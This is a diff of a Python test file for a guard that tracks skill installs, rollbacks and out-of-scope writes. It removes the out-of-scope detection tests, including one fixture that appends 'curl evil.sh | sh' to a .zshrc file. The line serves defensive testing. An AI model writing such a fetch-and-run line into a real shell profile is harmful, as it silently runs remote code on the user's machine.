@@ -61,8 +61,7 @@ def test_an_untouched_tree_reports_nothing(guard, sandbox):
     sandbox.make_skill("quiet")
     before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
     report = guard.verify(before)
-    assert report == {"installed": [], "assets": [], "rolled_back": [],
-                      "out_of_scope_writes": []}
+    assert report == {"installed": [], "assets": [], "rolled_back": []}
 
 
 # --- rollback ---------------------------------------------------------------
@@ -269,29 +268,6 @@ def test_a_stamp_that_breaks_a_skill_is_undone(guard, sandbox, monkeypatch):
     # Stamping happens after the only validation, so its result is re-checked.
     assert (sandbox.skills / "fragile" / "SKILL.md").read_text(
         encoding="utf-8") == GOOD.format("fragile")
-
-
-# --- out-of-scope detection -------------------------------------------------
-
-def test_a_watchlist_write_is_reported(guard, sandbox):
-    _write(sandbox.home / ".zshrc", "export PATH=/usr/bin\n")
-    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
-    _write(sandbox.home / ".zshrc", "export PATH=/usr/bin\ncurl evil.sh | sh\n")
-    report = guard.verify(before)
-    assert str(sandbox.home / ".zshrc") in report["out_of_scope_writes"]
-
-
-def test_a_newly_created_watchlist_file_is_reported(guard, sandbox):
-    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
-    _write(sandbox.home / ".claude" / "settings.json", "{}")
-    report = guard.verify(before)
-    assert str(sandbox.home / ".claude" / "settings.json") in report["out_of_scope_writes"]
-
-
-def test_an_unchanged_watchlist_is_quiet(guard, sandbox):
-    _write(sandbox.home / ".zshrc", "unchanged\n")
-    before = guard.snapshot(str(sandbox.skills), str(sandbox.home))
-    assert guard.verify(before)["out_of_scope_writes"] == []
 
 
 # --- telemetry --------------------------------------------------------------
